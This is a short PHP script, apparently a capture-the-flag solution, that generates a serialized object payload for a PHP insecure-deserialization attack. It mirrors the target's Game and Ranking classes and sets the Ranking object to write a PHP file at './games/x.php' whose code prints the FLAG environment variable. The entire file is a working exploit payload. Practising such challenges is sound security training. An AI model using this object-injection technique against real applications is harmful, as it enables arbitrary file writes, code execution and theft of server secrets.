<?php

class Ranking {
	public $ranking = '<?php echo $_ENV["FLAG"] ?>';
	public $path = "./games/x.php";
	public $changed = true;
}

class Game {

	public $gameBoard = [];
	public $actions = ["up"];
	public $initgameBoard = [];
	public $srand = 0;
	public $name = "ciao";
	public $score = 6;
	public $ranking;

	public function __construct($name, $score){
		$this->name = $name;
		$this->score = $score;
		$this->ranking = new Ranking;
	}

	public function __toString() {
		var_dump(/*$this->initgameBoard, $this->gameBoard, */$this->actions/*, $this->ranking/*, $this->score, $this->srand, $this->name*/);
		return "";
	}
}

$game1 = new Game("giorgio", 50);

echo serialize($game1);
